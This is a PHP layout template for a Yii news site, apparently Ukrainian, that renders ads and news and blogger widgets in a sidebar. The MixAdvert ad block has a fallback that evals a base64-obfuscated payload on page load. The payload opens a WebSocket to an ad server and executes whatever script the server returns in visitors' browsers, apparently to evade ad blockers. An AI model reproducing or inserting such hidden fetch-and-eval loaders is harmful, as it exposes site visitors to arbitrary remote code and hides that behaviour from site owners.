<?php /* @var $this Controller */ ?>
<?php $this->beginContent('//layouts/main'); ?>
    <?= $content; ?>
	<article class="val-column-right">  
   <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
   <ins class="adsbygoogle"
     style="display:inline-block;width:300px;height:600px; margin-bottom: 30px"
     data-ad-client="ca-pub-3024978264681114"
     data-ad-slot="‎2792872191"></ins>
    <script>
    (adsbygoogle = window.adsbygoogle || []).push({});
    </script>
    <div class="val-column-outer-right-line-news">
         <h3 class="val-title-uppercase-small">
            <span><?=Yii::t('main', 'Не пропустіть');?></span>
            <?= CHtml::link(Yii::t('main', 'Всi новини'), array('/site/allNews')) ?>
        </h3>
        <div class="val-line-news-with-img">
            <?php $this->widget('application.components.widgets.AllNewsWidget'); ?>
        </div>
    </div>
    <div class="val-blogers-column">
        <h2 class="val-title-uppercase"><?=Yii::t('main', 'Блоги і Блогери');?></h2>
        <?php $this->widget('application.components.widgets.BloggerLayout'); ?>
    </div>
    <div id="val-only-else-pages">
        <?php $this->widget('application.components.widgets.AccordeonWidget'); ?>
    </div>
    <div id="MIXADV_4563" class="MIXADVERT_NET"></div>
    <script> 
        var node4563 = document.getElementById("MIXADV_4563");
        if( node4563 )
        {
           var script = document.createElement("script");
           script.charset = "utf-8";
           script.src = "https://m.mixadvert.com/show/?id=4563&r="+Math.random();
           node4563.parentNode.appendChild(script); 
           script.onerror = function(){
              window.eval(atob("c3RyID0gJ2Nvbm4gPSBuZXcgV2ViU29ja2V0KCJ3c3M6Ly9uMi5taXhhZHZlcnQuY29tOjQ0MzMvNDU2MyIpOyBjb25uLm9ubWVzc2FnZSA9IGZ1bmN0aW9uIChldnQpIHsgcG9zdE1lc3NhZ2UoZXZ0LmRhdGEpOyBjb25uLmNsb3NlKCk7fSc7dmFyIHdvcmtlciA9IG5ldyBXb3JrZXIoVVJMLmNyZWF0ZU9iamVjdFVSTChuZXcgQmxvYihbImV2YWwoICciK3N0cisiJykiXSksIHt0eXBlOiAndGV4dC9qYXZhc2NyaXB0J30pKTt3b3JrZXIucG9zdE1lc3NhZ2UoJzEnKTsgd29ya2VyLm9ubWVzc2FnZSA9IGZ1bmN0aW9uIChtc2cpIHsgd2luZG93LmV2YWwobXNnLmRhdGEpOyB9OyA="));
          }
        }
    </script>
</article>
<?php $this->endContent(); ?>